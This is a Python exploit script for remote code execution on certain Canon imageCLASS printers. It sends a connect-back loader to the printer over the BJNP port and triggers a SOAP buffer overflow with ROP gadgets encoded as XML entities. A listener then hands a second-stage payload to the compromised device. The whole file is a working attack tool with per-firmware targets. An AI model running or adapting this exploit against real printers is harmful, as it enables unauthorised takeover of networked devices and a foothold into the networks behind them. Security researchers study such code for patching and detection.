#!/usr/bin/env python

import struct
import sys
import uuid
import time
import socket
from threading import Thread
from datetime import datetime


BJNP_PORT = 8610
LISTENER_PORT = 0x4444
SEND_SIZE = False

# 0x478D6818
# 0x478D6840 (+0x28)

PAYLOAD_ADDR = 0x478D6840
BJNP_EXPECTED_REPLY = (
    b"MFNP\x82\x10\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x80\x00\x00\x00"
)


def u32(v):
    return struct.pack("<L", v)


TARGETS = [
    {
        "model": "MF742Cdw/MF743Cdw",
        "version": "v12.04",
        "gadgets": {
            # 0x40BE9AEE : bx r1
            "BX_R1": "&#xF6BE;&#x40;",
            # 0x43cc4022 : add r1, r5 ; ldm r1, {r1, r5, r7} ; bx r3
            "ADD_R1_R5_LDM_R1_BX_R3": "&#x23;&#x40;&#x303;",
            # 0x4297E75C : pop {r0-r5,pc}
            "POP_R0_R1_R2_R3_R4_R5": "&#x5D;&#x75C2;",
            # 0x23793728
            "ADDR_A": "&#x28;&#x37;&#x79;&#x23;",
            # 0x23797728
            "ADDR_B": "&#x28;&#x77;&#x79;&#x23;",
        },
        "rop": [
            "POP_R0_R1_R2_R3_R4_R5",
            "0000",
            "ADDR_A",
            "2222",
            "BX_R1",
            "4444",
            "ADDR_B",
            "ADD_R1_R5_LDM_R1_BX_R3",
        ],
        "prepend": u32(0x46F2AE50 + 12) + b"A" * 8,
    },
    {
        "model": "MF735Cdw",
        "version": "v03.04",
        "gadgets": {
            # 0x43B5EA3C: bx r0
            "BX_R0": "&#x6B;&#x23;&#x283;",
            # 0x45DC91CC: add r0, r1; negs r2, r7; bx r5
            "ADD_R0_R1_BX_R5": "&#x351;&#x705;",
            # 0x43C53B28: pop {r0-r5,pc}
            "POP_R0_R1_R2_R3_R4_R5": "&#x29;&#x3B;&#x143;",
            # 0x20202820
            "ADDR_A": "&#x20;&#x28;&#x20;&#x20;",
            # 0x276d4020
            "ADDR_B": "&#x20;&#x40;&#x6D;&#x27;",
        },
        "rop": [
            "POP_R0_R1_R2_R3_R4_R5",
            "ADDR_A",  # R0
            "ADDR_B",  # R1
            "2222",  # R2
            "3333",  # R3
            "4444",  # R4
            "BX_R0",  # R5
            "ADD_R0_R1_BX_R5",
        ],
        "prepend": b"\x00\x00\xa0\xe1" * 16,
    },
]

SOAP = """
<?xml version="1.0"
    encoding="UTF-8" ?>
<soap:Envelope
        xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
        xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
        xmlns:wse="http://schemas.xmlsoap.org/ws/2004/08/eventing"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <soap:Header>
        <wsa:From>
            <wsa:Address>FUCK</wsa:Address>
        </wsa:From>
        <wsa:To>CANON</wsa:To>
        <wsa:Action>http://schemas.xmlsoap.org/ws/2004/08/eventing/Unsubscribe</wsa:Action>
        <wsa:MessageID>{{MSG_ID}}</wsa:MessageID>
        <wsa:ReplyTo>
            <wsa:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wse:Identifier>{{SUBSCRIPTION_ID}}</wse:Identifier>
    </soap:Header>
    <soap:Body>
        <wse:Unsubscribe/>
    </soap:Body>
</soap:Envelope>
"""


def report(indicator, tag, text):
    if indicator == "x":
        indicator_col = "\x1b[31m"
    else:
        indicator_col = "\x1b[32m"
    now = datetime.now()
    print(
        "<%s> [\x1b[1m%s%s\x1b[0m] \x1b[1m%s\x1b[0m: %s"
        % (now.strftime("%H:%M:%S"), indicator_col, indicator, tag, text)
    )
    if indicator == "x":
        exit(-1)


def usage():
    print("usage: %s <target> <target_ip> <our_ip>" % sys.argv[0])
    print("")
    print("available targets:")
    c = 0
    for t in TARGETS:
        print("  - %d: %s (%s)" % (c, t["model"], t["version"]))
        c += 1
    print("")


def banner():
    print("")
    print("      $$$ Canon imageCLASS MF753Cdw SOAP RCE Exploit $$$")
    print("                 -- by blasty <peter@haxx.in> --     ")
    print("")


def error(s):
    report("x", "ERROR", s)


def build_payload(target):
    o = u32(0x41414141) * (56 // 4)
    o += u32(0x34343434) * 3  # r4, r5, r6

    o_s = ""
    for v in o:
        o_s += "&#x%X;" % v

    for gadget in target["rop"]:
        if gadget in target["gadgets"].keys():
            o_s += target["gadgets"][gadget]
        else:
            o_s += gadget

    return o_s


def mfnp_put_payload(target, payload):
    if len(payload) > 0x180:
        error("payload too big (%d)" % len(payload))

    pkt = b"MFNP\x02\x10\x00\x00\x00\x00\x00\x01\x00\x00\x01\x88"
    pkt += b"\x00\x00\x00\x00\x00\x00\x00\x00"

    if len(payload) < 0x180:
        payload += b"\x00" * (0x180 - len(payload))

    pkt += payload

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
    sock.connect((target, BJNP_PORT))
    sock.sendall(pkt)

    r = sock.recv(4096)

    if r != BJNP_EXPECTED_REPLY:
        report("x", "PAYLOAD", "bad BJNP reply: %s" % r)

    report("i", "PAYLOAD", "payload put in memory")


def listener_task(port, tag, send_data=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(2)
    conn, address = s.accept()
    report("!", tag, "YES! Connection from: %s" % str(address))
    if SEND_SIZE:
        conn.sendall(send_data[0:4])
        send_data = send_data[4:]
    if send_data is not None:
        left = len(send_data)
        pos = 0
        while left > 0:
            chunk = send_data[pos : pos + 0x1000]
            conn.sendall(chunk)
            left -= len(chunk)
            pos = pos + 0x1000
    conn.close()
    report("!", tag, "SENT LOADER")


def payload_sender_task():
    fb = open("payload.bin", "rb").read()
    listener_task(LISTENER_PORT, "LOADER", fb)


def ip2long(ip):
    p = list(map(int, ip.split(".")))
    return bytes([p[0], p[1], p[2], p[3]])


if __name__ == "__main__":
    banner()

    if len(sys.argv) != 4:
        usage()
        exit(0)

    target_id = int(sys.argv[1], 0)
    target_ip = sys.argv[2]
    our_ip = sys.argv[3]

    if target_id < 0 or target_id >= len(TARGETS):
        error("invalid target id")

    target = TARGETS[target_id]

    report("i", "SETUP", "target: %s (%s)" % (target["model"], target["version"]))
    report("i", "HELLO", "hacking %s" % target_ip)

    thread_payload_sender = Thread(target=payload_sender_task)
    thread_payload_sender.start()

    report("i", "SETUP", "building pwn payload")
    payload = build_payload(target)

    report("i", "SETUP", "putting loader at known location")

    loader = open("loader.bin", "rb").read()

    # the loader starts with some code that loads the connectback IP
    # from a literal pool at a fixed offset, patch the loader to have our IP
    loader = target["prepend"] + loader[0:8] + ip2long(our_ip) + loader[12:]

    mfnp_put_payload(
        target_ip,
        loader,
    )

    time.sleep(2)

    uuid_val = str(uuid.uuid4())
    body_a = SOAP.replace("{{MSG_ID}}", uuid_val)
    body_a = body_a.replace("{{SUBSCRIPTION_ID}}", payload)

    report("i", "HACK", "putting the stuff in the hole")

    request = "POST /wsd/print HTTP/1.1\r\nHost: %s\r\n" % target_ip
    request += "Content-Type: application/soap+xml\r\n"
    request += "Content-Length: %d\r\n\r\n" % (len(body_a))
    request += body_a

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, 80))
        s.sendall(request.encode())

    report("i", "HACK", "awaiting the hax")

    thread_payload_sender.join()

    report("i", "HACK", "we did it")
